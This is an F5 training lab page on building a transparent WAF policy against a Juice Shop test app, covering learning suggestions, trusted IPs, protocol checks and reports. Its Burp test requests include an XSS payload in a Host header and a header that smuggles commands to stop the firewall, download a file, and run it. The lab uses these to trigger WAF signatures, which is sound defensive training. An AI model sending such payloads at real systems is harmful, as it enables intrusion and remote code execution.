@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<head>
+  
+  <!-- Google Tag Manager -->
+  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-PPZPQ6');</script>
+  <!-- End Google Tag Manager -->
+    <title>Exercise 4.1: Transparent Policy</title>
+  
+
+  <meta charset="utf-8">
+  <!-- Twitter Bootstrap viewport setting -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <!-- F5 metadata -->
+  <meta name="title" content="Exercise 4.1: Transparent Policy"/>
+  <meta name="product" content="F5 Web Application Firewall Solutions"/>
+  <meta name="version" content=""/>
+  <meta name="updated_date"  content="2023-05-04 07:11:03"/>
+  <meta name="archived" content="Archived documents excluded"/>
+  <meta name="doc_type" content="Manual"/>
+  <meta name="lifecycle" content="release"/>
+  <meta name="F5 Web Application Firewall Solutions" content=""/>
+
+
+  
+
+  
+  <link href="https://cdn.f5.com/favicon.ico" rel="icon">
+
+</head>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Exercise 4.1: Transparent Policy &#8212; F5 Web Application Firewall Solutions  documentation</title>
+    <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/css/bootstrap.min.css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/graphviz.css" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/copybutton.css" />
+    <link rel="stylesheet" href="../../../_static/css/bootstrap.min.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/css/f5.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/css/f5-theme.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/css/CoveoFullSearch.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/css/custom.css" type="text/css" />
+    <link rel="stylesheet" href="https://use.fontawesome.com/21fb8a09c3.css" type="text/css" />
+    <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js"></script>
+    <script src="../../../_static/jquery.js"></script>
+    <script src="../../../_static/underscore.js"></script>
+    <script src="../../../_static/_sphinx_javascript_frameworks_compat.js"></script>
+    <script src="../../../_static/doctools.js"></script>
+    <script src="../../../_static/sphinx_highlight.js"></script>
+    <script src="../../../_static/clipboard.min.js"></script>
+    <script src="../../../_static/copybutton.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+    <link rel="next" title="WAF 111 - Protecting Yourself Against the OWASP Top 10" href="../../../waf111/waf111.html" />
+    <link rel="prev" title="Module 4: Transparent WAF Policy" href="../module4.html" /> 
+  </head><body>
+  <div id="clouddocs-header"></div>
+
+    <div id="sidebar" class="section-nav">
+      
+      <!--  version selector ------------------>
+      <div id="version_selector_wrapper">
+      </div>
+      <nav class="nav-sidebartoc">
+
+        
+         <h5>F5 Web Application Firewall Solutions  </h5>
+        
+
+        <hr>
+        <span class="nav-sidebartoc">
+            <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current"><a class="reference internal" href="../../waf102.html">WAF 102 - Getting started with WAF, Bot Detection and Threat Campaigns</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../../labinfo/labinfo.html">Lab Environment &amp; Topology</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../module1-ipi-and-geo/module1.html">Module 1: IPI &amp; Geolocation</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../module2-bot/module2.html">Module 2: Bot Detection</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../module3-tc/module3.html">Module 3: Threat Campaigns</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="../module4.html">Module 4: Transparent WAF Policy</a><ul class="current">
+<li class="toctree-l3 current"><a class="current reference internal" href="#">Exercise 4.1: Transparent Policy</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../../waf111/waf111.html">WAF 111 - Protecting Yourself Against the OWASP Top 10</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../waf201/waf201.html">WAF 201 – Elevated WAF Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../waf2023/waf2023.html">WAF 101 - BIG-IP Security:  Mitigating App Vulnerabilities with AWAF</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../waf301/waf301.html">WAF 301 - AWAF in a CI/CD Pipeline (Self Guided)</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../waf302/waf302.html">WAF 302 - Enabling API Protection with APM and AWAF</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../waf341/waf341.html">WAF 341 – Advanced Protection and Positive Security (Self Guided)</a></li>
+</ul>
+
+        </span><!-- Use this file to add extra links to the bottom of the ToC sidebar -->
+<hr>
+  <span class="nav-sidebartoc">
+ <!-- insert content here -->
+  </span>
+      </nav>
+    </div>
+
+
+    <div id="right-sidebar">
+      <h7 style="font-weight:normal">On this page:</h7>
+      <nav class="nav-sidebartoc">
+        <span class="nav-sidebartoc">
+            <ul>
+<li><a class="reference internal" href="#">Exercise 4.1: Transparent Policy</a><ul>
+<li><a class="reference internal" href="#objective">Objective</a></li>
+<li><a class="reference internal" href="#learning-blocking">Learning &amp; Blocking</a></li>
+<li><a class="reference internal" href="#false-positive-remediation">False Positive Remediation</a></li>
+<li><a class="reference internal" href="#policy-building-process">Policy Building Process</a></li>
+<li><a class="reference internal" href="#burp-ing-the-app">Burp’ing the App</a></li>
+<li><a class="reference internal" href="#accept-the-remaining-learning-suggestions">Accept the Remaining Learning Suggestions</a></li>
+<li><a class="reference internal" href="#http-compliancy-check-bad-host-header-value">HTTP Compliancy Check - Bad Host Header Value</a></li>
+<li><a class="reference internal" href="#server-technologies-attack-signatures">Server Technologies &amp; Attack Signatures</a></li>
+<li><a class="reference internal" href="#framework-attacks">Framework Attacks</a></li>
+<li><a class="reference internal" href="#review-reporting">Review Reporting</a></li>
+</ul>
+</li>
+</ul>
+
+         </span>
+      </nav>
+    </div>
+
+
+
+
+
+  
+  <div class="main active" id="content" >
+    <article class="docs-container site-article-inner">
+              <!-- custom breadcrumb -->
+        <h5>
+            <a href="../../../index.html">F5 Web Application Firewall Solutions</a>
+              &gt; <a href="../../waf102.html">WAF 102 - Getting started with WAF, Bot Detection and Threat Campaigns</a>
+              &gt; <a href="../module4.html">Module 4: Transparent WAF Policy</a>
+
+          <span class="right">
+             <a href="../../../_sources/waf102/module4-xparent-policy/lab1/lab1.rst.txt" rel="nofollow">Source</a> |
+             <a href="https://github.com/f5devcentral/f5-agility-labs-waf">Edit on <i class="fa fa-github" aria-hidden="true"></i></a>
+          </span>
+        </h5>
+        <!-- end custom breadcrumb -->
+      
+
+
+    <!--a title="Export PDF" id="export-pdf" class="btn btn btn-link pull-right">View PDF</a-->
+    <button type="button" id="export-pdf" class="btn btn-link right">PDF</button>
+
+
+    
+     
+         <div class="sidebar" id="version-warning" style="display: none;">
+           <p class="first sidebar-title">
+           <span class="icon fa fa-info-circle fa-lg"></span> Version notice:</p>
+           <p class="last" id="currentVersion"></p>
+          </div>
+
+
+     <div role="main">
+        
+  <div class="section" id="exercise-4-1-transparent-policy">
+<h1>Exercise 4.1: Transparent Policy<a class="headerlink" href="#exercise-4-1-transparent-policy" title="Permalink to this heading">¶</a></h1>
+<div class="section" id="objective">
+<h2>Objective<a class="headerlink" href="#objective" title="Permalink to this heading">¶</a></h2>
+<p>We created a transparent policy way back in Lab 1 to configure Geolocation enforcement &amp; Layer 7 XFF inspection for IPI. We then tested out the Threat Campaign signatures in Lab 3 and now we will explore and test some of the other components that should be in scope for enforcement early on in your WAF deployment.</p>
+<ul class="simple">
+<li>Review Learning &amp; Blocking &amp; Policy Building Process settings</li>
+<li>Implement HTTP Protocol Compliancy checks and test</li>
+<li>Test with a HTTP Protocol violation plus XSS attack</li>
+<li>Enable Server Technologies &amp; Attack Signatures</li>
+<li>Review Reporting</li>
+<li>Estimated time for completion <strong>30</strong> <strong>minutes</strong>.</li>
+</ul>
+</div>
+<div class="section" id="learning-blocking">
+<h2>Learning &amp; Blocking<a class="headerlink" href="#learning-blocking" title="Permalink to this heading">¶</a></h2>
+<p>Recall from Lab 1, that we used the Rapid Deployment Policy template to create our policy and we deployed it in manual learning mode. This means as violations and/or false positives occur, the system will make suggestions to modify the policy. The admin will manually evaluate the suggestions and Approve, Ignore or Delete them.</p>
+<ol class="arabic simple">
+<li>Navigate to <strong>Security &gt; Application Security &gt;  Policy Building &gt; Traffic Learning</strong> and notice that there are no “learning suggestions” displayed yet. So far, all of our site traffic has been generated by a malicious script so now it’s time to generate some real user traffic.</li>
+<li>In the Chrome browser open a new tab, click on the <strong>OWASP Juiceshop</strong> bookmark in the Bookmarks Toolbar and accept the certificate warning. Browse around the site and perform several actions as a real user would.</li>
+<li>In the top right of the site, click the <strong>Account Menu</strong> and select <strong>Login</strong> and then click <strong>Not yet a customer?</strong>.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/customer.png"><img alt="../../../_images/customer.png" src="../../../_images/customer.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="4">
+<li>Create an account using “<a class="reference external" href="mailto:f5student&#37;&#52;&#48;f5agility&#46;com">f5student<span>&#64;</span>f5agility<span>&#46;</span>com</a>” for email and use the same password you’ve been using for the labs and pick whatever security question you like.</li>
+<li>Click <strong>Register</strong> and then login to the Juice Shop.</li>
+<li>Click back on the Advanced WAF GUI tab in your browser and refresh the traffic learning screen. If you navigated away or closed the tab, open a new one, login to Advanced WAF and go to: <strong>Security &gt; Application Security &gt;  Policy Building &gt; Traffic Learning</strong>.</li>
+<li>You will see many Suggestions and a <strong>learning score</strong> that the system assigns based on how many times it has seen an occurence and from what source. You can <strong>Accept</strong>, <strong>Delete</strong>, <strong>Ignore</strong> or <strong>Export</strong> the suggestion.</li>
+</ol>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">This is where it usually starts to get a little dicey for a first-time WAF admin. Always look very carefully at the suggested action before deciding on which action to take. It is also helpful to define a whitelist so that the policy can learn quicker and from known trusted sources. You generally do not want the system learning from random and/or hostile Internet traffic and making suggestions to relax the policy.</p>
+</div>
+<ol class="arabic simple" start="8">
+<li>Notice that most of the learning suggestions involve enabling various HTTP protocol Compliance Checks.</li>
+<li>Find and select the suggestion for <strong>Enable HTTP protocol compliance check - HTTP Check: No Host header in HTTP/1.1 request</strong>.</li>
+<li>Review the <strong>Suggested Action</strong> and click <strong>Accept</strong> and <strong>Apply Policy</strong>.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/proto.png"><img alt="../../../_images/proto.png" src="../../../_images/proto.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="11">
+<li>What just happened and how do you see what changed by who and when? Audit Log of course!</li>
+<li>Go to <strong>Security &gt; Application Security &gt;  Audit &gt; Log</strong> and review the most recent actions. You can see who, what and when every component within a policy was modified. (This step is not necessary but meant to draw your attention to the audit log)</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/audit.png"><img alt="../../../_images/audit.png" src="../../../_images/audit.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="13">
+<li>Click on the Element Name (blue hyperlink) <strong>No Host header in HTTP/1.1 request</strong> This takes you to the Learning and Blocking Settings screen where the check was enabled.</li>
+<li>Notice that by default in the Rapid Deployment Policy, learning is enabled for most of the common HTTP Protocol compliancy checks. Also notice that the <strong>Enable</strong> checkbox next to <strong>No Host header in HTTP/1.1 request</strong> is now checked.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/http_req.png"><img alt="../../../_images/http_req.png" src="../../../_images/http_req.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="15">
+<li>Uncheck the <strong>Learn box</strong> for this violation then <strong>Save</strong> and <strong>Apply</strong> policy.</li>
+<li>Open a new Terminal and send the following request. This request is being sent without a host header and should now raise a violation in our Event Log rather than a learning suggestion.</li>
+</ol>
+<p><code class="docutils literal notranslate"><span class="pre">curl</span> <span class="pre">-k</span> <span class="pre">-H</span> <span class="pre">'Host:'</span> <span class="pre">https://juiceshop.f5agility.com/</span></code></p>
+<ol class="arabic simple" start="17">
+<li>Review the Alarmed request in <strong>Security &gt; Event Logs &gt; Application  &gt; Requests</strong>.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/httpviol.png"><img alt="../../../_images/httpviol.png" src="../../../_images/httpviol.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="18">
+<li>To review, you just took a learning suggestion and accepted it to enable a protocol compliancy check and then you disabled future learning suggestions for this event. Violations are now alarmed in the Event Logs.</li>
+<li>Go back to <strong>Security &gt; Application Security &gt; Policy Building &gt; Traffic Learning</strong> You would now typically go through and enable all of the checks that the policy is recommending regarding http protocol compliance and evasion technique detection.</li>
+</ol>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">Remember that your policy is safely in transparent mode so accepting suggestions and enabling checks will only raise alarms and no blocking actions will occur. This is why it is very important to start off transparently until you fully understand the basics of managing a WAF policy.</p>
+</div>
+</div>
+<div class="section" id="false-positive-remediation">
+<h2>False Positive Remediation<a class="headerlink" href="#false-positive-remediation" title="Permalink to this heading">¶</a></h2>
+<ol class="arabic simple">
+<li>In Juice Shop click on any item and <strong>Write a review</strong> and click <strong>Submit</strong></li>
+<li>In Advanced WAF navigate to <strong>Security &gt; Event Logs &gt; Application  &gt; Requests</strong> and look for the Sev3 alert for the request going to <strong>rest/product/reviews</strong>.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/sev3.png"><img alt="../../../_images/sev3.png" src="../../../_images/sev3.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="3">
+<li>Click <strong>Accept</strong> to allow a new method of <strong>Put</strong> in our policy. Click <strong>Apply Policy</strong>. Navigate to <strong>Security &gt; Application Security &gt; Headers &gt; Methods</strong> and you will see our newly added “Allowed Method” of <strong>Put</strong>.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/headmeth.png"><img alt="../../../_images/headmeth.png" src="../../../_images/headmeth.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="4">
+<li>In a new browser tab, make sure you are logged in to JuiceShop and leave another review for <strong>Apple Juice</strong>.</li>
+<li>Review the request in <strong>Security &gt; Event Logs &gt; Application  &gt; Requests</strong>.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/put.png"><img alt="../../../_images/put.png" src="../../../_images/put.png" style="width: 600px;" /></a>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">Put is not a default allowed method in a Rapid Deployment Policy. Working through learning suggestions and false-positives is an essential part of policy development and should occur as early as possible during software development and testing. It IS NOT best-practice to wait until the site is in production before bolting on a WAF policy as an after-thought.</p>
+</div>
+</div>
+<div class="section" id="policy-building-process">
+<h2>Policy Building Process<a class="headerlink" href="#policy-building-process" title="Permalink to this heading">¶</a></h2>
+<p>One thing you can do to greatly increase the integrity of the learning suggestions is, define trusted IP’s. You can also tell the system to Only learn from trusted IP’s which is a very wise thing to do if you are developing policy on an app that is exposed to untrusted or Internet traffic.</p>
+<ol class="arabic simple">
+<li>Go to <strong>Security &gt; Application Security &gt;  Policy Building &gt; Learning and Blocking Settings</strong> and expand the <strong>Policy Building Process</strong> section at the bottom. Change the view from Basic to Advanced. Here you can see settings that this particular policy is using for learning. Notice that <strong>Trusted IP Addresses List</strong> is empty.</li>
+<li>Click the little window/arrow icon next to <strong>Trusted IP Addresses List</strong> is empty.</li>
+<li>This takes you to: <strong>Security &gt; Application Security &gt; Security Policies &gt; Policies List &gt; juiceshow_waf policy &gt; IP Address Exceptions</strong>. Click <strong>Add</strong>.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/ip_exception.png"><img alt="../../../_images/ip_exception.png" src="../../../_images/ip_exception.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="4">
+<li>For IP Address: <strong>10.0.0.0</strong> and for Netmask: <strong>255.0.0.0</strong>. Check the box for <strong>Policy Builder trusted IP</strong> and click <strong>Create</strong> and <strong>Apply Policy</strong>.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/ip.png"><img alt="../../../_images/ip.png" src="../../../_images/ip.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="5">
+<li>Navigate back to <strong>Security &gt; Application Security &gt;  Policy Building &gt; Learning and Blocking Settings</strong> and expand the <strong>Policy Building Process</strong> section. Notice that our newly defined network is now a <strong>Trusted IP</strong>. This will greatly enhance the speed and quality of learning suggestions.</li>
+<li>Change the view from Basic to Advanced and review all the fine-grained configurations for the <strong>Policy Building Process</strong>.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/pbp.png"><img alt="../../../_images/pbp.png" src="../../../_images/pbp.png" style="width: 600px;" /></a>
+<p><strong>You now know how to define a trusted ip and configure the policy building process settings</strong></p>
+</div>
+<div class="section" id="burp-ing-the-app">
+<h2>Burp’ing the App<a class="headerlink" href="#burp-ing-the-app" title="Permalink to this heading">¶</a></h2>
+<p>In this section we are going to use the free/community version of an excellent DAST tool; Burp. Unfortunately, the free version does not actually allow DAST but it is still an excellent tool for packet crafting and that’s exactly how we are going to use it.</p>
+</div>
+<div class="section" id="accept-the-remaining-learning-suggestions">
+<h2>Accept the Remaining Learning Suggestions<a class="headerlink" href="#accept-the-remaining-learning-suggestions" title="Permalink to this heading">¶</a></h2>
+<ol class="arabic simple">
+<li>Go to <strong>Security &gt; Application Security &gt;  Policy Building &gt; Traffic Learning</strong> and select all of the remaining suggestions and click <strong>Accept &gt; Accept suggestions</strong> and then <strong>Apply Policy</strong>.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/accept.png"><img alt="../../../_images/accept.png" src="../../../_images/accept.png" style="width: 600px;" /></a>
+</div>
+<div class="section" id="http-compliancy-check-bad-host-header-value">
+<h2>HTTP Compliancy Check - Bad Host Header Value<a class="headerlink" href="#http-compliancy-check-bad-host-header-value" title="Permalink to this heading">¶</a></h2>
+<p>The <strong>Bad Host Header Value</strong> check is an HTTP Parser Attack and definitely something that should be implemented as part of <strong>Good WAF Security</strong>. It was included in the suggestions you just accepted.</p>
+<p><strong>Risk:</strong>
+If we allow bad host header values they can be used to Fuzz web servers and gather system information. Successful exploitation of this attack could allow for the execution of XSS arbitrary code.</p>
+<ol class="arabic simple">
+<li>Launch <strong>Burp</strong> from the Desktop. <strong>Do Not click multiple times. It takes a few moments to load</strong>.</li>
+</ol>
+<img alt="../../../_images/burp.png" src="../../../_images/burp.png" />
+<p><strong>DO NOT update</strong>.</p>
+<ol class="arabic simple">
+<li>Choose <strong>Temporary Project</strong> and click <strong>Next</strong> and then click <strong>Start Burp</strong>.</li>
+<li>Click the <strong>Repeater</strong> tab and paste in the following http request (<strong>Replace password with the password you’ve been using all along.</strong>) and click <strong>Send</strong>.</li>
+<li>A popup window will appear to configure the target details. For host use: <strong>10.1.10.145</strong>. For port use: <strong>443</strong>. Check the <strong>Use HTTPS</strong> box.</li>
+<li>Click <strong>Send</strong></li>
+</ol>
+<div class="line-block">
+<div class="line"><br /></div>
+</div>
+<p><strong>XSS in HOST Header</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">10.1.10.145</span><span class="o">/</span><span class="n">rest</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">login</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">BabyYoda</span>
+<span class="n">Pragma</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
+<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">38</span>
+<span class="n">Host</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">alert</span><span class="p">(</span><span class="n">document</span><span class="o">.</span><span class="n">cookie</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+
+<span class="n">username</span><span class="o">=</span><span class="n">f5student</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="p">[</span><span class="n">password</span><span class="p">]</span>
+</pre></div>
+</div>
+<a class="reference internal image-reference" href="../../../_images/burpreq.png"><img alt="../../../_images/burpreq.png" src="../../../_images/burpreq.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="5">
+<li>Back in Advanced WAF, browse to <strong>Security &gt; Event Logs &gt; Application &gt; Requests</strong> and review the alert for this Sev5 attack. Note the alert severity is much higher (5) for this attack type due to several violations occuring including HTTP protocol Violations and several XSS signatures.</li>
+<li>Review all the details and then click the <strong>3</strong> under the <strong>Attack Signature Detected</strong> violation to see all of the staged XSS Attack Signatures that were triggered.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/xss-out.png"><img alt="../../../_images/xss-out.png" src="../../../_images/xss-out.png" style="width: 600px;" /></a>
+</div>
+<div class="section" id="server-technologies-attack-signatures">
+<h2>Server Technologies &amp; Attack Signatures<a class="headerlink" href="#server-technologies-attack-signatures" title="Permalink to this heading">¶</a></h2>
+<p>In this final exercise we will examine server technologies which allow you to automatically discover server-side frameworks, web servers and operating systems. This feature helps when the backend technologies are not well known or communicated from the Dev team.</p>
+<ol class="arabic simple">
+<li>Go to <strong>Security &gt; Application Security &gt; Policy Building &gt; Learning and Blocking Settings &gt; Attack Signatures</strong></li>
+<li>Review the Attack Signatures that were applied during policy creation from back in Lab 1. <strong>Generic Detection Signatures (High/Medium Accuracy)</strong>. Notice that they are set to <strong>Learn/Alarm/Block and Staging is enabled</strong>.</li>
+<li>Locate Server Technologies and expand the option. Click <strong>Enable Server Technology Detection</strong>, click <strong>Save</strong> and then click the <strong>New Window Icon</strong> next to Server Technologies.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/st.png"><img alt="../../../_images/st.png" src="../../../_images/st.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="4">
+<li>This takes you to: <strong>Security &gt; Application Security &gt; Security Policies &gt; juiceshop_waf &gt; General Settings</strong>. Scroll down to <strong>Advanced Settings &gt; Server Technologies</strong> and click in the box. Search for Linux since we know the server is running Linux.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/svr_tech.png"><img alt="../../../_images/svr_tech.png" src="../../../_images/svr_tech.png" style="width: 600px;" /></a>
+<p>The system will display a box describing which new signature sets will be applied. Click <strong>Confirm</strong>.</p>
+<a class="reference internal image-reference" href="../../../_images/ast.png"><img alt="../../../_images/ast.png" src="../../../_images/ast.png" style="width: 600px;" /></a>
+<p><strong>Make sure to Save and Apply Policy.</strong></p>
+<ol class="arabic simple" start="5">
+<li>Go to <strong>Security &gt; Application Security &gt; Policy Building &gt; Learning and Blocking Settings &gt; Attack Signatures</strong> and notice the new Unix/Linux Server Technology signature sets that were added to the policy.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/unix.png"><img alt="../../../_images/unix.png" src="../../../_images/unix.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="6">
+<li>Click <strong>Change</strong> and review all of the additional Signature Sets that you can add manually add to a policy. Click <strong>Cancel</strong></li>
+</ol>
+</div>
+<div class="section" id="framework-attacks">
+<h2>Framework Attacks<a class="headerlink" href="#framework-attacks" title="Permalink to this heading">¶</a></h2>
+<p>Back in BURP navigate to the repeater tab and adjust the payload to the following and hit <strong>Send</strong>. <strong>Replace password with the password you’ve been using all along</strong></p>
+<div class="line-block">
+<div class="line"><br /></div>
+</div>
+<p><strong>Framework Attack</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">10.1.10.145</span><span class="o">/</span><span class="n">rest</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">login</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">ImperialProbeDroid</span>
+<span class="n">Pragma</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
+<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="p">:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">iptables</span> <span class="n">stop</span><span class="p">;</span> <span class="n">service</span> <span class="n">iptables</span> <span class="n">stop</span><span class="p">;</span> <span class="n">SuSEfirewall2</span> <span class="n">stop</span><span class="p">;</span> <span class="n">reSuSEfirewall2</span> <span class="n">stop</span><span class="p">;</span> <span class="n">cd</span> <span class="o">/</span><span class="n">tmp</span><span class="p">;</span> <span class="n">wget</span> <span class="o">-</span><span class="n">c</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">10.1.10.145</span><span class="p">:</span><span class="mi">443</span><span class="o">/</span><span class="mi">7</span><span class="p">;</span> <span class="n">chmod</span> <span class="mi">777</span> <span class="mi">7</span><span class="p">;</span> <span class="o">./</span><span class="mi">7</span><span class="p">;</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">38</span>
+<span class="n">Host</span><span class="p">:</span> <span class="n">DarthMaul</span>
+
+<span class="n">username</span><span class="o">=</span><span class="n">f5student</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="p">[</span><span class="n">password</span><span class="p">]</span>
+</pre></div>
+</div>
+<ol class="arabic simple">
+<li>Browse to <strong>Security &gt; Event Logs &gt; Application &gt; Requests</strong> and look for the most recent Sev5 Event. Select the event, review the violations and click the <strong>2</strong> under Occurrences for the Attack signature detected violation.</li>
+<li>Click the little blue <strong>i</strong> and review the Attack Signature Details. We can see that this was a Systems based Unix/Linux Signature in staging mode.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/systems.png"><img alt="../../../_images/systems.png" src="../../../_images/systems.png" style="width: 600px;" /></a>
+<p>We are now alerting on attacks aimed at Server Technologies.</p>
+</div>
+<div class="section" id="review-reporting">
+<h2>Review Reporting<a class="headerlink" href="#review-reporting" title="Permalink to this heading">¶</a></h2>
+<ol class="arabic simple">
+<li>Navigate to <strong>Security &gt; Reporting &gt; Application &gt; Charts</strong> and change the View By: to <strong>Ip Intelligence</strong> and review the chart.</li>
+<li>Change the chart type from Absolute to <strong>Stacked</strong></li>
+<li>Change the View By: to <strong>Client IP Addresses</strong></li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/client_ip.png"><img alt="../../../_images/client_ip.png" src="../../../_images/client_ip.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="4">
+<li>Change the Advanced Filter to: <strong>Top Alarmed URLs</strong>.</li>
+<li>Change the Advanced Filter to: <strong>Top attacks in the last day</strong> and View By: to <strong>Client Countries</strong>.</li>
+<li>Explore additional charts that you can generate and export.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/charts.png"><img alt="../../../_images/charts.png" src="../../../_images/charts.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="7">
+<li>Navigate to <strong>Security &gt; Overview &gt; Application &gt; Traffic</strong></li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/overview.png"><img alt="../../../_images/overview.png" src="../../../_images/overview.png" style="width: 600px;" /></a>
+<ol class="arabic simple" start="8">
+<li>Go to <strong>Security &gt; Overview &gt; OWASP Compliance</strong> and review the report. As you can see there is still much to do from a best-practices App-Sec perspective. For more information check out our OWASP 111 Lab which covers these categories in detail.</li>
+</ol>
+<a class="reference internal image-reference" href="../../../_images/owasp.png"><img alt="../../../_images/owasp.png" src="../../../_images/owasp.png" style="width: 600px;" /></a>
+<p><strong>This completes Lab 4</strong></p>
+<p><strong>Congratulations! It was a long road but you made it though and now have the knowledge to go forth and start testing. Given the Advanced WAF is a proxy, you could build a Virtual Edition F5 locally on your machine and implement a number of test scenarios with no impacts to a production application. Contact your friendly neighborhood F5 Solutions Engineer for more information!! Hope to see you in the 241 Elevated WAF Protection class! Cheers!!!</strong></p>
+</div>
+</div>
+
+
+     </div>
+    
+     <div class="row next-prev-btn-row">
+       <div class="col-lg-12">
+       
